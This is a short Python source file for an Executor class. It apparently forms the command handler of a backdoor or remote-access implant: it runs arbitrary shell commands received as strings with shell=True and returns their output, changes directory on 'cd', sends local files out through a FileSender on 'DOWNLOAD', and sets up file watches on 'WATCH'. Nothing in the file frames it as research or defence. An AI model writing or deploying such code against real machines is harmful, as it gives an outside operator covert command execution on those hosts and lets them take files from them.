import subprocess
import os
from bdfileutils import FileMonitor, FileSender


class Executor(object):
    def __init__(self):
        self.proc = None
        self.working_directory = os.path.dirname(os.path.realpath(__file__))
        self.filemon = FileMonitor()
        self.sender = FileSender()

    def add_watches(self, path_list):
        for path in path_list:
            self.add_watch(path)

    def add_watch(self, path):
        try:
            directory, filename = path.split(' ')
        except ValueError:
            directory = path
            filename = None

        self.filemon.add_watch(directory, filename=filename)

    def upload(self, path):
        self.sender.send_file(path)

    def run(self, command):
        """
        Executes the given command in a shell and returns the command output.
        """

        # cd is a special case. The subprocess cannot change the working directory of our process, 
        # so we have to do it manually
        if command[:3] == 'cd ':
            try:
                os.chdir(os.path.expanduser(command[3:]))
            except OSError as e:
                return None, str(e)

            return None, None
        if command[:7] == 'UPLOAD ':
            #
            pass
        if command[:9] == 'DOWNLOAD ':
            if not os.path.exists(command[9:]):
                return None, "File doesn't exist"

            self.upload(command[9:])

            return '', None

        if command[:6] == 'WATCH ':
            # add a watch
            self.add_watch(command[6:])
            return 'Watch added', None
        else:
            self.proc = subprocess.Popen([str(command)], stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, shell=True)
            return self.proc.communicate()
